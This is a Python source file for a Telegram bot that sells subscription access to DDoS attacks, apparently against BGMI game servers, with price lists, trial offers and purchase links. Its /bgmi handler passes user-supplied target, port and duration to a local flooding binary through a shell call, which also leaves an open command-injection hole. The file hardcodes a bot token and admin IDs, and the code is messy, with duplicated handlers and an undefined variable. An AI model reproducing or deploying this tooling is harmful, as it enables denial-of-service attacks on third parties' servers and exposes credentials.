import urllib.parse
import telebot
from datetime import datetime, timedelta
import json
import os
import telebot
import subprocess
import datetime
import os
import urllib.parse
import urllib.parse
import telebot
from datetime import datetime, timedelta
import json
import os
global_user_id = None
#from keep_alive import keep_alive
#keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7139376005:AAEQ9YWKJiz4XQhBzrFoXjQEUnBGhlAzY94')

# Admin user IDs
admin_id = ["912866707","992584240"]

# File to store allowed user IDs
USER_FILE = "user.txt"

# File to store command logs
LOG_FILE = "logies.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6304384568"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
            else:
                file.truncate(0)
                response = "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙚𝙭𝙥𝙞𝙧𝙮 𝙙𝙖𝙩𝙚. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙩𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 𝙡𝙖𝙩𝙚𝙧."
            else:
                response = "𝙐𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨 🤦‍♂️."
        else:
            response = "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙖𝙣𝙙 𝙩𝙝𝙚 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣 (𝙚.𝙜., 1⃣𝙝𝙤𝙪𝙧, 2⃣𝙙𝙖𝙮𝙨, 3⃣𝙬𝙚𝙚𝙠𝙨, 4⃣𝙢𝙤𝙣𝙩𝙝𝙨) 𝙩𝙤 𝙖𝙙𝙙 😘."
    else:
        response = "𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙣𝙤𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚𝙙 𝙮𝙚𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 :-  @SrcEsp."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 👍."
            else:
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙩𝙝𝙚 𝙡𝙞𝙨𝙩 ❌."
        else:
            response = '''𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙥𝙚𝙘𝙞𝙛𝙮 𝘼 𝙐𝙨𝙚𝙧 𝙄𝘿 𝙩𝙤 𝙍𝙚𝙢𝙤𝙫𝙚. 
✅ 𝙐𝙨𝙖𝙜𝙚: /remove <userid>'''
    else:
        response = "𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙣𝙤𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚𝙙 𝙮𝙚𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 :-  @SrcEsp. 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
                else:
                    file.truncate(0)
                    response = "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:   
            response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 ❌."
    else:
        response = "𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙣𝙤𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚𝙙 𝙮𝙚𝙩 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 :-  @SrcEsp. ❄."
    bot.reply_to(message, response)


    
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙐𝙎𝙀𝙍𝙎 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
                else:
                    file.truncate(0)
                    response = "𝙪𝙨𝙚𝙧𝙨 𝘾𝙡𝙚𝙖𝙧𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙪𝙨𝙚𝙧𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 ❌.."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @SrcEsp 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
        except FileNotFoundError:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @SrcEsp ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @SrcEsp ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿🚀\n\n🎯𝙏𝘼𝙍𝙂𝙀𝙏🎯: {target}\n🛜𝙋𝙊𝙍𝙏🛜: {port}\⌛𝙏𝙄𝙈𝙀⏳: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n☄️𝙈𝙚𝙩𝙝𝙤𝙙☄️: VIP- User of @SrcEsp"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command

    
    
    
# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝙔𝙤𝙪𝙧 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙇𝙤𝙜𝙨:\n" + "".join(user_logs)
                else:
                    response = "❌ 𝙉𝙤 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙇𝙤𝙜𝙨 𝙁𝙤𝙪𝙣𝙙 𝙁𝙤𝙧 𝙔𝙤𝙪 ❌."
        except FileNotFoundError:
            response = "𝙉𝙤 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙."
    else:
        response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙏𝙤 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /bgmi : 𝙈𝙚𝙩𝙝𝙤𝙙 𝙁𝙤𝙧 𝘽𝙜𝙢𝙞 𝙎𝙚𝙧𝙫𝙚𝙧𝙨. 
💥 /rules : 𝙋𝙡𝙚𝙖𝙨𝙚 𝘾𝙝𝙚𝙘𝙠 𝘽𝙚𝙛𝙤𝙧𝙚 𝙐𝙨𝙚 !!.
💥 /mylogs : 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝙍𝙚𝙘𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠𝙨.
💥 /plan : 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙊𝙪𝙧 𝘽𝙤𝙩𝙣𝙚𝙩 𝙍𝙖𝙩𝙚𝙨.
💥 /myinfo : 𝙏𝙊 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝙒𝙃𝙊𝙇𝙀 𝙄𝙉𝙁𝙊.

🤖 𝙏𝙤 𝙎𝙚𝙚 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /admincmd : 𝙎𝙝𝙤𝙬𝙨 𝘼𝙡𝙡 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨.

𝘽𝙪𝙮 𝙁𝙧𝙤𝙢 :- @Sanjay_Src | @Mr_InsaneX
𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 :- https://t.me/SrcEsp
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)





###weeellcome

import urllib.parse
import telebot
from datetime import datetime, timedelta
import json
import os

# 
# File to store user data
USER_DATA_FILE = "user_data.json"
USER_TXT_FILE = "user.txt"

# Load user data from file
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as file:
            return json.load(file)
    return {}

# Save user data to file
def save_user_data(user_data):
    with open(USER_DATA_FILE, "w") as file:
        json.dump(user_data, file)

# Append user ID to user.txt file
def append_user_id(user_id):
    with open(USER_TXT_FILE, "a") as file:
        file.write(f"{user_id}\n")



    

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    global_user_id = user_id
    username = "Sanjay_Src"
    message_text = f"Hello I Want To Buy Your DDos Bot & My User ID is: {user_id}"
    encoded_message = urllib.parse.quote(message_text)
    url = f"https://t.me/{username}?text={encoded_message}"

    # Create inline keyboard
    keyboard = telebot.types.InlineKeyboardMarkup()
    button = telebot.types.InlineKeyboardButton(text="🛒 Buy Now", url=url)
    keyboard.add(button)

    response = f'''🌟 **Welcome to the Premium DDos Bot!** 🌟
    
Hi {user_name}! 👋🏼 We offer high-quality DDos protection services. 🛡️
    
🔹 To get access, use the command: /help
🔹 To claim free trial, use the command: /trial
🔹 Interested in buying? Check out our bot!

Your user ID: {user_id}
    
👇🏼 Click the button below to purchase:'''
    
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=keyboard)

from datetime import datetime, timedelta
import telebot
import urllib.parse

# Assuming load_user_data() and other necessary functions are defined elsewhere

@bot.message_handler(commands=['trial'])
def send_current_time(message):
    user_id = str(message.from_user.id)  # Ensure user_id is a string for consistency
    current_time = datetime.now()
    user_data = load_user_data()

    username = "Sanjay_Src"
    message_text = f"Hello I Want To Buy Your DDos Bot & My User ID is: {user_id}"
    encoded_message = urllib.parse.quote(message_text)
    url = f"https://t.me/{username}?text={encoded_message}"

    # Create inline keyboard
    keyboard = telebot.types.InlineKeyboardMarkup()
    button_buy = telebot.types.InlineKeyboardButton(text="🛒 Buy Now", url=url)

    if user_id in user_data:
        last_claimed_time = datetime.strptime(user_data[user_id], "%Y-%m-%d %H:%M:%S")
        if current_time - last_claimed_time < timedelta(days=1):
            # Trial already claimed
            response = '''<b>🚫 Trial Already Claimed 🚫</b>
    
You have already claimed the trial in the last 24 hours. 😔
    
But don't worry! You can still buy the bot using the link below:'''
            bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=telebot.types.InlineKeyboardMarkup().add(button_buy))
            return

    # Add both buttons if trial is not claimed yet
    button_trial = telebot.types.InlineKeyboardButton(text="🚀 Activate Trial", callback_data='activate_trial')
    keyboard.add(button_trial)
    keyboard.add(button_buy)

    response = f'''<b>🎁 Trial Available! 🎁</b>
    
Exciting news! You can activate your trial for using our bot and enjoy all the features for the next 24 hours. 🚀

Your user ID: {user_id}
    
👇🏼 Click the button below to get your free trial or purchase the bot:'''
    
    bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=keyboard)
    


    
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1 hour, 2 days, 3 weeks, 4 months) to add."
    else:
        response = "You have not purchased yet. Purchase now from @SrcEsp."

    bot.reply_to(message, response)
    
@bot.callback_query_handler(func=lambda call: call.data == 'activate_trial')
def handle_trial_activation(call):
    user_id = str(call.from_user.id)
    current_time = datetime.now()
    user_data = load_user_data()

    # Set the trial expiry time (1 day from now)
    expiry_time = current_time + timedelta(days=1)
    user_data[user_id] = expiry_time.strftime("%Y-%m-%d %H:%M:%S")

    # Check if the user is already in the allowed list
    if user_id in allowed_user_ids:
        last_claimed_time = user_approval_expiry.get(user_id, datetime.min)
        if current_time - last_claimed_time < timedelta(days=1):
            # Trial already claimed
            response = '''<b>🚫 Trial Already Claimed 🚫</b>
    
You have already claimed the trial in the last 24 hours. 😔
    
But don't worry! You can still buy the bot using the link below:'''
        else:
            # User is in the list but trial period expired, re-add user
            duration = 1
            time_unit = 'days'
            if set_approval_expiry_date(user_id, duration, time_unit):
                response = f'''🎉 **Trial Activated!** 🎉
    
Congratulations! Your trial has been successfully re-activated. You can now enjoy our bot services for the next 24 hours. 🚀
    
For more options, click the button below:'''
                # Save user data after successful activation
                save_user_data(user_data)
            else:
                response = "Failed to set approval expiry date. Please try again later."
    else:
        # Add user for trial
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")
        duration = 1
        time_unit = 'days'
        if set_approval_expiry_date(user_id, duration, time_unit):
            response = f'''🎉 **Trial Activated!** 🎉
    
Congratulations! Your trial has been successfully activated. You can now enjoy our bot services for the next 24 hours. 🚀
    
For more options, click the button below:

Click /help to View Commands'''
            # Save user data after successful activation
            save_user_data(user_data)
        else:
            response = "Failed to set approval expiry date. Please try again later."

    # Create inline keyboard
    keyboard = telebot.types.InlineKeyboardMarkup()
    button_buy = telebot.types.InlineKeyboardButton(text="🛒 Buy Now", url="https://t.me/Sanjay_Src")
    keyboard.add(button_buy)

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, parse_mode='HTML', reply_markup=keyboard)






bgmi_cooldown = {}
COOLDOWN_TIME = 30


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙊𝙣 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 ❌. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 3⃣0⃣ 𝙨𝙚𝙘 𝘽𝙚𝙛𝙤𝙧𝙚 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙏𝙝𝙚 /bgmi 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘼𝙜𝙖𝙞𝙣."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 2000:
                response = "Error: Time interval must be less than 2000."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                process = subprocess.run(full_command, shell=True)
                response = f"🏁𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙.🏁 Target: {target} Port: {port} Time: {time} seconds"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝙐𝙨𝙖𝙜𝙚 :- /𝙗𝙜𝙢𝙞 <target> <port> <time>"  # Updated command syntax
    else:
        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @DONATE_OWNER_BOT"

    bot.reply_to(message, response)





@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙏𝙝𝙚𝙨𝙚 𝙍𝙪𝙡𝙚𝙨 ⚠️:

1⃣. ᴅᴏɴᴛ ʀᴜɴ ᴛᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴀᴄᴋs !! ᴄᴀᴜsᴇ ᴀ ʙᴀɴ ғʀᴏᴍ ʙᴏᴛ
2⃣. ᴅᴏɴᴛ ʀᴜɴ 2⃣ ᴀᴛᴛᴀᴄᴋs ᴀᴛ sᴀᴍᴇ ᴛɪᴍᴇ ʙᴇᴄᴢ ɪғ ᴜ ᴛʜᴇɴ ᴜ ɢᴏᴛ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ʙᴏᴛ.
3⃣. ᴍᴀᴋᴇ sᴜʀᴇ ʏᴏᴜ ᴊᴏɪɴᴇᴅ https://t.me/SrcEsp ᴏᴛʜᴇʀᴡɪsᴇ ɴᴏᴛ ᴡᴏʀᴋ
4⃣. ᴡᴇ ᴅᴀɪʟʏ ᴄʜᴇᴄᴋs ᴛʜᴇ ʟᴏɢs sᴏ ғᴏʟʟᴏᴡ ᴛʜᴇsᴇ ʀᴜʟᴇs ᴛᴏ ᴀᴠᴏɪᴅ ʙᴀɴ!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝘽𝙧𝙤𝙩𝙝𝙚𝙧 𝙊𝙣𝙡𝙮 1⃣ 𝙋𝙡𝙖𝙣 𝙄𝙨 𝙋𝙤𝙬𝙚𝙧𝙛𝙪𝙡𝙡 𝙏𝙝𝙚𝙣 𝘼𝙣𝙮 𝙊𝙩𝙝𝙚𝙧 𝘿𝙙𝙤𝙨 !!:

ᴠɪᴘ 🌟 :
-> ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ : 1200 (s)
> ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ : 30 sᴇᴄ
-> ᴄᴏɴᴄᴜʀʀᴇɴᴛs ᴀᴛᴛᴀᴄᴋ : 5

ᴘʀ-ɪᴄᴇ ʟɪsᴛ💸 :
ᴅᴀʏ-->100 ʀs
ᴡᴇᴇᴋ-->500 ʀs
ᴍᴏɴᴛʜ-->1500 ʀs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝘼𝙧𝙚 𝙃𝙚𝙧𝙚!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙏𝙤 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 𝘽𝙮 𝘼𝙙𝙢𝙞𝙣:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
